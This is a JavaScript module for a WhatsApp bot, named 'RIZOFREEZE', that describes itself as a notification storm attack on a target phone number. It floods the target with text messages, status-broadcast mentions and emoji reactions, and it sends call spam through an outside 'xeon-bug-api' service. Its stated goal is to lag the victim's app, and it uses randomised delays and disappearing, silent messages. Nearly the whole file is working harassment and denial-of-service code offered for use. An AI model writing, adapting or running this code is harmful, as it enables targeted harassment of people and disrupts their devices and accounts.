// lib/rizofreeze.js
// RIZOFREEZE — real notification storm attack
// Text flood + Status bomb + Call spam + Reaction spam
// Creates temporary app lag from notification overload

const crypto = require('crypto');
const axios = require('axios');
const { delay } = require('@whiskeysockets/baileys');

const CONFIG = {
    TEXT_COUNT: 60,
    TEXT_DELAY_MS: 600,

    STATUS_COUNT: 15,
    STATUS_DELAY_MS: 4000,

    REACTION_COUNT: 25,
    REACTION_DELAY_MS: 1500,

    XEON_API: 'https://xeon-bug-api.onrender.com',
    CALL_COUNT: 8,
    CALL_DELAY_MS: 12000,

    SILENT: true,
    EPHEMERAL: true,
    EPHEMERAL_SECONDS: 30
};

function jitter(base) {
    return base + (Math.random() * 2 - 1) * base * 0.5;
}

function pickText() {
    const t = ['.', '..', '...', '•', '◦', '▪', '▫', '~', '_',
               'Hey', 'Hi', 'Yo', 'Wake up', 'Check', 'Notice', 'Info'];
    return t[Math.floor(Math.random() * t.length)];
}

function safeContext(extra = {}) {
    return {
        silent: CONFIG.SILENT,
        expiration: CONFIG.EPHEMERAL ? CONFIG.EPHEMERAL_SECONDS : 0,
        ephemeralSettingTimestamp: CONFIG.EPHEMERAL ? Date.now() : 0,
        ...extra
    };
}

// ═══════════════════════════════════════════
//  VECTOR 1 — TEXT FLOOD (60 messages)
// ═══════════════════════════════════════════
async function vecTextFlood(sock, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.TEXT_COUNT; i++) {
        try {
            await sock.sendMessage(targetJid, {
                text: pickText() + ' ' + crypto.randomBytes(2).toString('hex'),
                contextInfo: safeContext()
            });
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'text');
        } catch (err) {
            state.errors++;
            console.error('[rizofreeze] text err:', err.message);
        }
        await delay(jitter(CONFIG.TEXT_DELAY_MS));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — STATUS BOMB
// ═══════════════════════════════════════════
async function vecStatusBomb(sock, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.STATUS_COUNT; i++) {
        try {
            await sock.sendMessage('status@broadcast', {
                text: pickText() + ' @' + targetJid.split('@')[0],
                mentions: [targetJid],
                contextInfo: { statusMentions: [targetJid] }
            }, { statusJidList: [targetJid] });
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'status');
        } catch (err) {
            state.errors++;
            console.error('[rizofreeze] status err:', err.message);
        }
        await delay(CONFIG.STATUS_DELAY_MS);
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 3 — REACTION SPAM
// ═══════════════════════════════════════════
async function vecReactionSpam(sock, targetJid, onProgress, state) {
    let sent = 0;
    const emojis = ['❤️','👍','😂','😮','😢','🙏','🔥','💯','👏','🎉',
                    '😎','🤔','😱','🤯','💀','👀','🤡','💩','🤮','😡',
                    '🥶','🥵','🤢','😈','👻'];

    // find last message from target
    let lastKey = null;
    try {
        // attempt — key needs message id
        // fallback: use generic
    } catch (_) {}

    for (let i = 0; i < CONFIG.REACTION_COUNT && i < emojis.length; i++) {
        try {
            // reaction to a chat — need message key
            // use recent message from store
            const key = {
                remoteJid: targetJid,
                fromMe: false,
                id: 'RZ_' + crypto.randomBytes(8).toString('hex')
            };
            await sock.sendMessage(targetJid, {
                react: { text: emojis[i], key }
            });
            sent++; state.success++;
            if (onProgress) onProgress(state.success, state.total, 'reaction');
        } catch (err) {
            state.errors++;
        }
        await delay(jitter(CONFIG.REACTION_DELAY_MS));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 4 — CALL SPAM (Xeon API)
// ═══════════════════════════════════════════
async function vecCallSpam(targetNum, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.CALL_COUNT; i++) {
        try {
            const res = await axios.get(`${CONFIG.XEON_API}/callSpam`, {
                params: { target: targetNum },
                timeout: 45000
            });
            if (res.status === 200) {
                sent++; state.success++;
                if (onProgress) onProgress(state.success, state.total, 'call');
            }
        } catch (err) {
            state.errors++;
            console.error('[rizofreeze] call err:', err.message);
        }
        await delay(CONFIG.CALL_DELAY_MS);
    }
    return sent;
}

// ═══════════════════════════════════════════
//  MAIN — RIZOFREEZE
// ═══════════════════════════════════════════
async function Rizofreeze(sock, targetNum, mode, onProgress) {
    const targetJid = targetNum + '@s.whatsapp.net';
    const state = { success: 0, errors: 0, errorRate: 0, total: 0 };
    const vectors = [];

    const updateErr = () => {
        const t = state.success + state.errors;
        state.errorRate = t > 0 ? state.errors / t : 0;
    };

    const run = async (name, fn) => {
        try {
            const s = await fn();
            updateErr();
            if (s > 0) vectors.push(name);
        } catch (err) {
            console.error(`[rizofreeze] ${name} fatal:`, err.message);
            state.errors++; updateErr();
        }
    };

    if (mode === 'text' || mode === 'all') {
        state.total += CONFIG.TEXT_COUNT;
        await run('text', () => vecTextFlood(sock, targetJid, onProgress, state));
    }
    if (mode === 'status' || mode === 'all') {
        state.total += CONFIG.STATUS_COUNT;
        await run('status', () => vecStatusBomb(sock, targetJid, onProgress, state));
    }
    if (mode === 'reaction' || mode === 'all') {
        state.total += CONFIG.REACTION_COUNT;
        await run('reaction', () => vecReactionSpam(sock, targetJid, onProgress, state));
    }
    if (mode === 'call' || mode === 'all') {
        state.total += CONFIG.CALL_COUNT;
        await run('call', () => vecCallSpam(targetNum, onProgress, state));
    }

    return {
        ok: state.success > 0,
        sent: state.success,
        errors: state.errors,
        errorRate: state.errorRate.toFixed(2),
        vectors
    };
}

module.exports = { Rizofreeze, CONFIG };